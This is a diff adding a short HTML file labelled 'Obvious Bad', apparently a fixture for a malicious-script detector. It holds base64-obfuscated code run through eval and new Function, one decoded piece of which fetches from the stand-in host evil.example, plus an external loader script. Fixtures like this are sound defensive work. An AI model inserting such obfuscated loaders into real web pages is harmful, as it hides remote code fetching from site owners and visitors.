@@ -1,0 +1,13 @@
+<!doctype html>
+<html>
+<head><meta charset="utf-8"><title>Obvious Bad</title></head>
+<body>
+  <div id="app" onclick="eval(atob('YWxlcnQoMSk='))">tap</div>
+  <script>
+    // decode-then-execute
+    var payload = atob('ZmV0Y2goImh0dHBzOi8vZXZpbC5leGFtcGxlL3giKQ==');
+    new Function(payload)();
+  </script>
+  <script src="loader.js"></script>
+</body>
+</html>
